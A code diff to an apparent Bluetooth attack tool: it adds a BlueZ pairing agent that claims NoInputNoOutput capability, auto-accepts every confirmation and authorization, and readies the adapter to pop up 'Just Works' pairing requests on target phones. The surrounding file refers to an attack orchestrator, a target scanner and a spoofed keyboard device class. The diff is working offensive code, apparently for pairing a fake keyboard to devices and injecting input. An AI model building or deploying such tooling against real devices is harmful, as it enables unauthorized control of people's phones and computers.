@@ -8,6 +8,7 @@ downstream modules (attack_orchestrator, TargetScanner, etc.).
 
 import dbus
 import dbus.mainloop.glib
+import dbus.service
 import logging
 import struct
 import subprocess
@@ -52,6 +53,15 @@ OWN_ADDR_RANDOM = 0x01
 ADV_CHANNEL_ALL = 0x07
 # Filter policy: allow scan/connect from any device
 ADV_FILTER_ALLOW_ALL = 0x00
+
+# ── Just Works SSP (Secure Simple Pairing) Constants ──────────────────
+# IO Capability "NoInputNoOutput" forces the "Just Works" association model,
+# which triggers an immediate pairing pop-up on the target device without
+# requiring numeric comparison or passkey entry on either side.
+AGENT_CAPABILITY_NO_INPUT_NO_OUTPUT = "NoInputNoOutput"
+AGENT_PATH_JUST_WORKS = "/org/bluez/agent_just_works"
+# Default passkey returned when the stack unexpectedly requests one
+JUST_WORKS_DEFAULT_PASSKEY = dbus.UInt32(0)
 
 # Bluetooth Class of Device (CoD) — Peripheral/Keyboard
 # 0x000540 = Major: Peripheral (0x05), Minor: Keyboard (0x40)
@@ -177,6 +187,93 @@ KEYBOARD_SDP_RECORD_XML = """<?xml version="1.0" encoding="UTF-8" ?>
 """
 
 
+class JustWorksAgent(dbus.service.Object):
+    """
+    BlueZ Agent1 implementing "Just Works" pairing (NoInputNoOutput IO capability).
+
+    When registered with BlueZ's AgentManager, this agent:
+    - Claims NoInputNoOutput IO capability, forcing SSP "Just Works" mode
+    - Auto-accepts all pairing confirmations and authorization requests
+    - Returns a zero passkey if the stack unexpectedly requests one
+    - Causes target devices (iOS, Android, etc.) to show an immediate
+      simple pairing pop-up without numeric comparison
+
+    This is a D-Bus service object that BlueZ calls back into during pairing.
+    """
+
+    AGENT_INTERFACE = "org.bluez.Agent1"
+
+    def __init__(self, bus, path=AGENT_PATH_JUST_WORKS):
+        """
+        Initialize the Just Works agent on the given D-Bus bus.
+
+        Args:
+            bus: D-Bus system bus instance.
+            path: D-Bus object path for this agent.
+        """
+        self._path = path
+        dbus.service.Object.__init__(self, bus, path)
+        logger.info("JustWorksAgent created at %s", path)
+
+    @property
+    def path(self) -> str:
+        """Return the D-Bus object path of this agent."""
+        return self._path
+
+    @dbus.service.method(AGENT_INTERFACE, in_signature="", out_signature="")
+    def Release(self):
+        """Called when the agent is unregistered."""
+        logger.info("JustWorksAgent released")
+
+    @dbus.service.method(AGENT_INTERFACE, in_signature="o", out_signature="s")
+    def RequestPinCode(self, device):
+        """Return an empty PIN code (not used in SSP, but required by interface)."""
+        logger.info("JustWorksAgent: RequestPinCode for %s → empty", device)
+        return ""
+
+    @dbus.service.method(AGENT_INTERFACE, in_signature="os", out_signature="")
+    def DisplayPinCode(self, device, pincode):
+        """Display PIN code (no-op for NoInputNoOutput)."""
+        logger.info("JustWorksAgent: DisplayPinCode %s for %s (ignored)", pincode, device)
+
+    @dbus.service.method(AGENT_INTERFACE, in_signature="o", out_signature="u")
+    def RequestPasskey(self, device):
+        """Return zero passkey — auto-accept for Just Works."""
+        logger.info("JustWorksAgent: RequestPasskey for %s → 0", device)
+        return JUST_WORKS_DEFAULT_PASSKEY
+
+    @dbus.service.method(AGENT_INTERFACE, in_signature="ouq", out_signature="")
+    def DisplayPasskey(self, device, passkey, entered):
+        """Display passkey (no-op for NoInputNoOutput)."""
+        logger.info(
+            "JustWorksAgent: DisplayPasskey %06d (entered %d) for %s (ignored)",
+            passkey, entered, device,
+        )
+
+    @dbus.service.method(AGENT_INTERFACE, in_signature="ou", out_signature="")
+    def RequestConfirmation(self, device, passkey):
+        """Auto-accept numeric confirmation — core of Just Works behavior."""
+        logger.info(
+            "JustWorksAgent: RequestConfirmation %06d for %s → auto-accepted",
+            passkey, device,
+        )
+
+    @dbus.service.method(AGENT_INTERFACE, in_signature="o", out_signature="")
+    def RequestAuthorization(self, device):
+        """Auto-authorize the device — allows pairing without user interaction."""
+        logger.info("JustWorksAgent: RequestAuthorization for %s → auto-authorized", device)
+
+    @dbus.service.method(AGENT_INTERFACE, in_signature="os", out_signature="")
+    def AuthorizeService(self, device, uuid):
+        """Auto-authorize service access (e.g., HID profile)."""
+        logger.info("JustWorksAgent: AuthorizeService %s for %s → authorized", uuid, device)
+
+    @dbus.service.method(AGENT_INTERFACE, in_signature="", out_signature="")
+    def Cancel(self):
+        """Called when a pairing operation is cancelled."""
+        logger.info("JustWorksAgent: pairing cancelled by remote")
+
+
 class BluetoothManager:
     """Manages the system Bluetooth adapter via D-Bus/BlueZ."""
 
@@ -193,6 +290,7 @@ class BluetoothManager:
         self._adapter: Optional[dbus.Interface] = None
         self._adapter_props: Optional[dbus.Interface] = None
         self._profile_manager: Optional[dbus.Interface] = None
+        self._just_works_agent: Optional[JustWorksAgent] = None
 
         self._init_dbus()
 
@@ -385,6 +483,113 @@ class BluetoothManager:
         """Return the BlueZ AgentManager1 interface for pairing agents."""
         obj = self._bus.get_object(BLUEZ_SERVICE, "/org/bluez")
         return dbus.Interface(obj, BLUEZ_AGENT_MANAGER_IFACE)
+
+    # ── Just Works Pairing Agent ──────────────────────────────────────
+
+    def register_just_works_agent(
+        self,
+        agent_path: str = AGENT_PATH_JUST_WORKS,
+    ) -> JustWorksAgent:
+        """
+        Register a "Just Works" pairing agent with BlueZ.
+
+        Creates a JustWorksAgent (NoInputNoOutput IO capability) and registers
+        it as the default pairing agent. This forces the Bluetooth SSP "Just Works"
+        association model, which:
+        - Skips numeric comparison on both sides
+        - Auto-accepts all pairing confirmations on our side
+        - Causes target devices to show an immediate simple pairing pop-up
+
+        Args:
+            agent_path: D-Bus object path for the agent.
+
+        Returns:
+            The registered JustWorksAgent instance.
+
+        Raises:
+            dbus.exceptions.DBusException: If agent registration fails.
+        """
+        # Unregister existing agent if any
+        if self._just_works_agent is not None:
+            self.unregister_just_works_agent()
+
+        # Create and register the agent
+        self._just_works_agent = JustWorksAgent(self._bus, agent_path)
+        agent_manager = self.get_agent_manager()
+        agent_manager.RegisterAgent(
+            dbus.ObjectPath(agent_path),
+            AGENT_CAPABILITY_NO_INPUT_NO_OUTPUT,
+        )
+        agent_manager.RequestDefaultAgent(dbus.ObjectPath(agent_path))
+
+        logger.info(
+            "Just Works agent registered at %s (capability: %s)",
+            agent_path,
+            AGENT_CAPABILITY_NO_INPUT_NO_OUTPUT,
+        )
+        return self._just_works_agent
+
+    def unregister_just_works_agent(
+        self,
+        agent_path: str = AGENT_PATH_JUST_WORKS,
+    ) -> None:
+        """
+        Unregister the Just Works pairing agent from BlueZ.
+
+        Args:
+            agent_path: D-Bus object path of the agent to unregister.
+        """
+        try:
+            agent_manager = self.get_agent_manager()
+            agent_manager.UnregisterAgent(dbus.ObjectPath(agent_path))
+            logger.info("Just Works agent unregistered from %s", agent_path)
+        except dbus.exceptions.DBusException as e:
+            logger.warning("Failed to unregister Just Works agent: %s", e)
+
+        self._just_works_agent = None
+
+    @property
+    def just_works_agent(self) -> Optional[JustWorksAgent]:
+        """Return the currently registered Just Works agent, or None."""
+        return self._just_works_agent
+
+    @property
+    def just_works_enabled(self) -> bool:
+        """Return whether the Just Works pairing agent is currently registered."""
+        return self._just_works_agent is not None
+
+    def configure_just_works_pairing(
+        self,
+        agent_path: str = AGENT_PATH_JUST_WORKS,
+    ) -> dict:
+        """
+        Full setup for Just Works pairing: enable adapter, register agent,
+        and configure the adapter as pairable with no timeout.
+
+        This is the high-level convenience method that prepares the adapter
+        for triggering immediate pairing pop-ups on target devices.
+
+        Args:
+            agent_path: D-Bus object path for the agent.
+
+        Returns:
+            Dict with configuration status details.
+        """
+        # Ensure adapter is powered, discoverable, and pairable
+        self.ensure_ready()
+
+        # Register the Just Works agent
+        agent = self.register_just_works_agent(agent_path)
+
+        logger.info("Just Works pairing fully configured on %s", self._adapter_name)
+        return {
+            "adapter": self._adapter_name,
+            "agent_path": agent.path,
+            "capability": AGENT_CAPABILITY_NO_INPUT_NO_OUTPUT,
+            "just_works_enabled": True,
+            "pairable": True,
+            "discoverable": True,
+        }
 
     # ── Low-Level HCI Utilities ────────────────────────────────────────
 
